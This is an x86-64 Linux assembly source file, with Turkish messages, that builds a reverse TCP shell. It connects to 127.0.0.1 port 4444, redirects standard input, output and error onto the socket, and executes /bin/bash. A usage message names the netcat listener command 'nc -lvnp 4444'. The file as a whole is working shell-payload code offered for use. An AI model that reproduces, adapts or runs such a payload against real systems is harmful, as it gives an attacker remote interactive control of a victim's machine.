bits 64 ; assembly 64 bit reverse tcp shell 127.0.0.1 4444 -> all diy
%include ".../writef.asm" ; write messages using my cool print function
section .data ; Data Segment
    hata1 db "Socket Olusturalamadi",10,"$" ; message 1
    hata2 db "Baglanti Kurulamadi",10,"$" ; message 2
    usage db "Kullanim icin -> nc -lvnp 4444",10,"$" ; message 3
    socket dq 0 ; variable socket
    bilgi dw 2 ; list for connection
        db 11h,5ch ; 4444 to hex
        db 7fh,0h,0h,1h ; 127.0.0.1 to hex
        db 0,0,0,0,0,0,0,0 ; 8 zero
    
    bilgil equ $-bilgi ; len of bilgi
    
    path db "/bin/bash" ; path of run program after connection
    
section .text ; Code Segment
    global main ; Entry main

main: ; main function
    mov rax, 41 ; sys_socket
    mov rdi,2 ; af_inet
    mov rsi,1 ; Sock_stream
    mov rdx, 0 ; ipproto_ip
    syscall ; call kernel
    cmp rax,0 ; if not create rax is equal -1
    jl error1 ; if have a error jump to eror1
    mov [socket], rax ; save sockfd into socket variable
    mov rax, 42 ; sys_connect
    mov rdi, [socket] ; 3 -> sockfd
    mov rsi, bilgi  ; -> my list for connection
    mov rdx, bilgil ; -> len of list
    syscall ; call kernel -> connection were
    cmp rax,0 ; connection error ?
    jl error2 ; if have error jump error2
    mov rax,33 ; sys_dup2
    mov rdi,[socket] ; oldfd 
    mov rsi,0 ; newfd
    syscall ; call kernel
    mov rax,33
    mov rdi,[socket]
    mov rsi,1
    syscall
    mov rax,33
    mov rdi,[socket]
    mov rsi,2
    syscall
    mov rax,59 ; sys_execve
    mov rdi, path ; execve("/bin/bash", 0, 0)
    mov rsi, 0 
    mov rdx,0
    syscall ; call kernel for execute
    call exit ; and exit

error1:
    mov r15, hata1
    call print
    call exit

error2:
    mov r15, hata2
    call print
    call exit
exit:
    mov r15, usage
    call print
    mov rax, "<"
    xor rdi, rdi
    syscall
